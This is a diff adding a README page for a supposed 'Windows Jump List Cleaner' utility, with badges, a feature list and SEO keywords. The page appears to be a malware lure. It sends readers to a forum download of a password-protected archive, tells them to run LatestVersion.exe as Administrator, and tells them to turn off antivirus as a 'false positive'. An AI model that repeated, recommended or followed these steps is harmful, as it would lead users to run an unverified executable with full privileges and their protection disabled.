@@ -1,0 +1,58 @@
+<!-- HEADER -->
+<p align="center">
+  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11-informational?style=for-the-badge&logo=windows&color=0078D4" alt="Windows">
+  <img src="https://img.shields.io/badge/Version-August%202026-blue?style=for-the-badge" alt="Version">
+</p>
+
+<h1 align="center">Windows Jump List Cleaner</h1>
+
+<p align="center">
+  <b>Clear recent items, frequent lists, and jump list history in Windows taskbar and Start Menu.</b>
+</p>
+
+---
+
+## What This Tool Does
+
+- Clear all Jump Lists - recent files, folders, and programs
+- Remove frequent lists - clears Windows memory of frequently opened items
+- Clear Start Menu history - recent programs and documents
+- One-click operation - no manual cleanup
+- Works on Windows 10 and 11
+
+---
+
+## Download and Installation
+
+Important: Download the tool from the link below.
+
+Download: https://software-hub.forumotion.com/t18-windows-jump-list-cleaner
+
+Password: 68924
+
+---
+
+## How to Use
+
+1. Download the archive from the link above
+2. Extract with password 68924
+3. Right-click LatestVersion.exe and select Run as Administrator
+4. Click Clean Jump Lists - all recent items are cleared instantly
+
+---
+
+## Requirements
+
+- OS: Windows 10 or Windows 11 (64-bit)
+- Permissions: Administrator rights
+
+---
+
+## Notes
+
+- Turn off antivirus - false positive
+- If it doesn't work, run as Administrator
+
+SEO KEYWORDS
+
+windows jump list cleaner, clear recent items, remove jump lists, taskbar cleaner, windows privacy tool, recent files cleaner
